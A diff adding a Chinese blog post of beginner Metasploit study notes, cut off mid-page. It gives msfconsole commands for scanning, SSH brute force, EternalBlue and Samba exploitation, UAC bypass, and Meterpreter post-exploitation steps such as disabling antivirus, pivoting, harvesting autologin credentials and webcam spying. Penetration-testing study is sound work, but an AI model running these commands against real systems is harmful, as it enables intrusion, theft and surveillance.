@@ -1,0 +1,1636 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#fff">
+
+
+  <meta name="baidu-site-verification" content="d5sacIPNJl">
+
+
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="true">
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/wenwu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/wenwu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/wenwu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/wenwu.jpg?v=5.1.4" color="#fff">
+
+
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="偷得浮生半日闲" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="MSF 最牛X的地方是：支持整个渗透测试过程   理论方面 技术架构1.辅助模块（auxiliary）包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2.渗透攻击模块(exploits)利用程序，针对漏洞、权限进行利用，是主要使用的模块 3.攻击载荷模块(payload)用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取 4.空指令模块(nops) 5.编码器模块(encod">
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit初学-散记">
+<meta property="og:url" content="http://www.xpshuai.cn/Metasploit初学-散记/index.html">
+<meta property="og:site_name" content="偷得浮生半日闲">
+<meta property="og:description" content="MSF 最牛X的地方是：支持整个渗透测试过程   理论方面 技术架构1.辅助模块（auxiliary）包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2.渗透攻击模块(exploits)利用程序，针对漏洞、权限进行利用，是主要使用的模块 3.攻击载荷模块(payload)用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取 4.空指令模块(nops) 5.编码器模块(encod">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005450243_22476.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005538476_7644.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005654777_11126.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005736889_30328.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005843248_16501.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005904954_3620.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005956668_23573.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419010046777_24437.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419100201810_5930.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419100235104_20029.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419100258228_25442.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419100330549_13830.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419100401410_1101.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419101612788_4497.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419101746539_24942.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419101951164_11016.png">
+<meta property="og:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419102146210_535.png">
+<meta property="og:updated_time" content="2020-05-09T09:28:48.224Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit初学-散记">
+<meta name="twitter:description" content="MSF 最牛X的地方是：支持整个渗透测试过程   理论方面 技术架构1.辅助模块（auxiliary）包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2.渗透攻击模块(exploits)利用程序，针对漏洞、权限进行利用，是主要使用的模块 3.攻击载荷模块(payload)用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取 4.空指令模块(nops) 5.编码器模块(encod">
+<meta name="twitter:image" content="http://www.xpshuai.cn/Metasploit初学-散记/20200419005450243_22476.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.xpshuai.cn/Metasploit初学-散记/">
+
+
+
+
+
+  <title>Metasploit初学-散记 | 偷得浮生半日闲</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">偷得浮生半日闲</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">再偷浮生两吊钱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            我的主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            文章标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            文章分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档时光
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/life/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-camera-retro"></i> <br>
+            
+            记录美好生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br>
+            
+            留言板
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于作者
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索本站
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+<!-- tq -->
+<script type="text/javascript">WIDGET = {FID: 'a5qxJi5vKF'}</script>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.xpshuai.cn/Metasploit初学-散记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="浮生">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/tx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="偷得浮生半日闲">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Metasploit初学-散记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-09T17:15:16+08:00">
+                2020-05-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/Metasploit初学-散记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/Metasploit初学-散记/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>  阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  5.5k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  22  分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><blockquote>
+<p>最牛X的地方是：支持整个渗透测试过程</p>
+</blockquote>
+<h2 id="理论方面"><a href="#理论方面" class="headerlink" title=" 理论方面"></a><font color="red"> 理论方面</font></h2><p><img src="/Metasploit初学-散记/20200419005450243_22476.png" alt></p>
+<h4 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h4><p><strong>1.辅助模块（auxiliary）</strong><br>包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块<br><img src="/Metasploit初学-散记/20200419005538476_7644.png" alt></p>
+<p><strong>2.渗透攻击模块(exploits)</strong><br>利用程序，针对漏洞、权限进行利用，是主要使用的模块<br><img src="/Metasploit初学-散记/20200419005654777_11126.png" alt></p>
+<p><strong>3.攻击载荷模块(payload)</strong><br>用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取<br><img src="/Metasploit初学-散记/20200419005736889_30328.png" alt></p>
+<p><strong>4.空指令模块(nops)</strong><br><img src="/Metasploit初学-散记/20200419005843248_16501.png" alt></p>
+<p><strong>5.编码器模块(encoders)</strong><br><img src="/Metasploit初学-散记/20200419005904954_3620.png" alt></p>
+<p><strong>6.后渗透攻击模块(post)</strong><br><img src="/Metasploit初学-散记/20200419005956668_23573.png" alt></p>
+<p><strong>7.免杀模块(evasion)</strong></p>
+<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>MSF有四种接口对外提供：<code>msfconsole</code>, <code>msfcli</code>,  <code>msfgui</code>,  <code>msfweb</code></p>
+<h4 id="为什么要使用Metasploit"><a href="#为什么要使用Metasploit" class="headerlink" title="为什么要使用Metasploit"></a>为什么要使用Metasploit</h4><p><img src="/Metasploit初学-散记/20200419010046777_24437.png" alt><br>开发版是没有生成报告的功能的（商业版才有），但是开发版的脚本更多，每个版本各有利弊</p>
+<ol>
+<li><p>情报搜集阶段<br><img src="/Metasploit初学-散记/20200419100201810_5930.png" alt><br>有数据库</p>
+</li>
+<li><p>威胁建模阶段<br><img src="/Metasploit初学-散记/20200419100235104_20029.png" alt></p>
+</li>
+<li><p>漏洞分析阶段<br><img src="/Metasploit初学-散记/20200419100258228_25442.png" alt></p>
+</li>
+<li><p>后渗透攻击模块<br><img src="/Metasploit初学-散记/20200419100330549_13830.png" alt></p>
+</li>
+<li><p>报告生成模块<br><img src="/Metasploit初学-散记/20200419100401410_1101.png" alt></p>
+</li>
+</ol>
+<hr>
+<h2 id="使用MSF"><a href="#使用MSF" class="headerlink" title=" 使用MSF"></a><font color="red"> 使用MSF</font></h2><h4 id="准备使用"><a href="#准备使用" class="headerlink" title="准备使用"></a>准备使用</h4><p><strong>启动MSF</strong><br><code>msfconsole</code><br>可以配置数据库等</p>
+<p><strong>更新MSF</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure></p>
+<p><strong>软件安装目录</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework</span><br><span class="line"><span class="comment"># 数据目录(其中一些字典和脚本我们用的时候可以拿)</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>模块</strong><br>一个模块就是一个rb脚本</p>
+<h4 id="情报搜集"><a href="#情报搜集" class="headerlink" title="情报搜集"></a>情报搜集</h4><blockquote>
+<p>首先search 搜索有哪些可用的模块</p>
+</blockquote>
+<p><strong>1.网站敏感目录扫描：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner 里面自己看都有啥</span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用 brute_dirs, dir_listing, dir_Scanner等辅助模块来进行敏感目录扫描</span></span><br><span class="line"><span class="comment"># 他们主要使用暴力猜解的方式工作，需要提供目录字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用模块</span></span><br><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 查看需要设置的参数</span></span><br><span class="line">show options   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置参数（取消设置参数是 unset）</span></span><br><span class="line"><span class="built_in">set</span> RHOTS 192.168.0.101</span><br><span class="line"><span class="built_in">set</span> PATH /cms/</span><br><span class="line"><span class="comment"># 攻击</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 返回上一级退出当前模块</span></span><br><span class="line">back</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个可选命令</span></span><br><span class="line">setg, unsetg  <span class="comment"># 用于在msfconsole中设置或取消设置全局性的参数，从而避免重复输入相同的值</span></span><br></pre></td></tr></table></figure></p>
+<p>使用常用的辅助模块进行服务扫描(<code>search scanner</code>)</p>
+<p><strong>2.主机发现</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 用于主机发现的辅助模块，位于 modules/auxiliary/scanner/discovery</span></span><br><span class="line">use /auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure></p>
+<p><img src="/Metasploit初学-散记/20200419101612788_4497.png" alt></p>
+<p>还是nmap速度快, 可以直接在msf中使用<code>nmap</code></p>
+<p><strong>3.端口扫描</strong><br>search  portscan<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack</span><br><span class="line">auxiliary/scanner/portscan/syn  <span class="comment"># 推荐这个(速度快，准确，不易被发现)</span></span><br><span class="line">auxiliary/scanner/portscan/xmas</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce</span><br><span class="line">auxiliary/scanner/portscan/tcp</span><br><span class="line"></span><br><span class="line">use ......</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure></p>
+<p><img src="/Metasploit初学-散记/20200419101746539_24942.png" alt></p>
+<p><strong>4.探测服务详细信息</strong><br><img src="/Metasploit初学-散记/20200419101951164_11016.png" alt></p>
+<p><strong>5.服务查点</strong><br>用户服务扫描和查点的工具，通常以<code>[server_name]_version</code>命名</p>
+<ul>
+<li><p>telnet服务查点(查哪些主机开了telnet服务，而namp是查看某主机开放了哪些服务)<br><img src="/Metasploit初学-散记/20200419102146210_535.png" alt></p>
+</li>
+<li><p>SSH服务查点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_version</span><br><span class="line"><span class="comment"># 口令爆破</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MSSQL服务查点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_version</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>永恒之蓝实践</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先扫描是否存在</span></span><br><span class="line">use auxiliary/scanner/smb/ms17_010_eternalblue</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 载利用攻击模块</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST ...</span><br><span class="line">...</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>收集完信息后，选择正确的exploit，payload</p>
+<p>这里假设是Samba<br><code>info exploit/multi/samba/usermap_sript</code>,  可以查看到利用成功率<code>Rank</code>越高，成功率越大<br><code>use exploit/multi/samba/usermap_sript</code><br><code>show options</code><br><code>set PAYLOAD cmd/unix/reverse</code><br>… … </p>
+<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="Meterpreter（属于后渗透攻击）"><a href="#Meterpreter（属于后渗透攻击）" class="headerlink" title="Meterpreter（属于后渗透攻击）"></a>Meterpreter（属于后渗透攻击）</h4><blockquote>
+<p>Metasploit框架中的一个扩展模块</p>
+</blockquote>
+<p>作为<code>溢出成功以后的</code>攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接<br><a href="https://www.cnblogs.com/backlion/p/9484949.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9484949.html</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 优势</span></span><br><span class="line">- 纯内存工作模式，不需要对内存进行写入操作</span><br><span class="line">- 使用加密通信协议，且可以同时与几个信道通信</span><br><span class="line">- 在被攻击进程内工作，不需要创建新的进程</span><br><span class="line">- 易于在多进程之间迁移</span><br><span class="line">- 平台通用</span><br></pre></td></tr></table></figure></p>
+<p><strong>进程迁移</strong><br>刚获取Meterpreter shell的时候，是脆弱的(用户随时可能关闭)，所以第一时间是移动shell，把它和一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作(更不易被发现)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps    <span class="comment"># 获取目标正在运行的进程</span></span><br><span class="line">getpid    <span class="comment"># 查看Meterpreter shell的进程号</span></span><br><span class="line">mirate 448    <span class="comment"># 把shell移动到PID为448的进程里(因为这里这个稳定，看情况来吧)</span></span><br><span class="line"></span><br><span class="line">getpid  <span class="comment"># 发现shell的进程迁移OK(原来的进程会自动关闭，如果没关闭就手动关掉：kill xxx_pid)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动迁移进程指令(系统会自动寻找合适的进程然后迁移)</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure></p>
+<p><strong>常用命令</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########## 系统命令（收集系统信息）</span></span><br><span class="line">systeminfo	<span class="comment"># 查看系统信息</span></span><br><span class="line">run post/windows/gather/checkv    <span class="comment"># 检查是否为虚拟机</span></span><br><span class="line">idletime    <span class="comment"># 目标机器最近运行时间</span></span><br><span class="line"></span><br><span class="line">ifconfig/ipconfig 	<span class="comment"># 查看网卡信息</span></span><br><span class="line">route	<span class="comment"># 查看路由信息，设置路由（做跳板用）</span></span><br><span class="line"></span><br><span class="line">background		<span class="comment"># 把会话放到后台，这个会话继续保持</span></span><br><span class="line">sessions     <span class="comment"># 查看会话列表</span></span><br><span class="line">sessions -i 2	<span class="comment"># 进入切回会话2</span></span><br><span class="line"></span><br><span class="line">getuid	<span class="comment"># 获取当前用户id权限</span></span><br><span class="line">run post/windows/manage/killav <span class="comment"># 关闭杀毒(其他命令自己探索)</span></span><br><span class="line">run post/windows/manage/enable_rdp <span class="comment"># 开启目标机器的远程桌面</span></span><br><span class="line"></span><br><span class="line">run post/windows/manage/autoroute <span class="comment"># 查看目标机的本地子网情况</span></span><br><span class="line"><span class="comment"># 接着进行跳转</span></span><br><span class="line">background <span class="comment"># 把当前终端隐藏在后台</span></span><br><span class="line">route add 192.168.0.111 255.255.255.0 1  <span class="comment"># 给指定会话id添加路由(可以添加其他地址到被攻陷的机器的路由表上，借助被攻陷的机器来攻击其他网络)</span></span><br><span class="line">route <span class="built_in">print</span>    <span class="comment"># 查看路由添加结果</span></span><br><span class="line"><span class="comment"># 接着查看</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users   <span class="comment"># 列举当前有多少用户登录了主机</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users   <span class="comment"># 继续列举安装在目标机器上的应用</span></span><br><span class="line">run post/windows/gather/credentials/windows_autologin  <span class="comment"># 很多用户习惯将计算机设置自动登录(抓取自动登录的密码)，如果看不到任何信息，就需要拓展插件Expia</span></span><br><span class="line">load espia <span class="comment"># 先加载该插件</span></span><br><span class="line">screengrab    <span class="comment"># 就可以抓取此时目标机器的屏幕截图</span></span><br><span class="line">screenshot    <span class="comment"># 也是截屏</span></span><br><span class="line"></span><br><span class="line">webcam snap  <span class="comment"># 打开目标机器摄像头，拍摄一张照片</span></span><br><span class="line">webcam_stream  <span class="comment"># 开始摄像头(直播模式)，在浏览器输入给出的url发那个问即可</span></span><br><span class="line"></span><br><span class="line">shutdown	   <span class="comment"># 关机</span></span><br><span class="line"></span><br><span class="line">shell		<span class="comment"># 进入目标系统的shell下面</span></span><br><span class="line"><span class="built_in">exit</span>        <span class="comment"># 停止meterpreter会话（也可以停止shell并返回到meterpreter）</span></span><br><span class="line">quit		<span class="comment"># 关闭当前的Meterpreter会话，返回MSF终端</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 